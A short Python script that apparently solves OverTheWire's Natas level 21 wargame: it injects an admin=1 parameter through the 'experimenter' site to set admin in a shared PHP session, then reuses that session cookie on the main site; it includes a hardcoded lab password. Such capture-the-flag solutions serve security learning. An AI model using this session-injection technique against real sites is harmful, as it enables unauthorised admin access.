import requests

target = 'http://natas21-experimenter.natas.labs.overthewire.org'
auth = ('natas21', '89OWrTkGmiLZLv12JY4tLj2c4FW0xn56')

params = dict(debug='', submit='', admin=1)
#                                  ^^^^^^^ <- this is the trick
cookies = dict()
r = requests.get(target, auth=auth, params=params, cookies=cookies)
phpsessid = r.cookies['PHPSESSID']
print (r.text)

target = 'http://natas21.natas.labs.overthewire.org'
params = dict(debug='')
cookies = dict(PHPSESSID=phpsessid)
r = requests.get(target, auth=auth, params=params, cookies=cookies)
print (r.text)
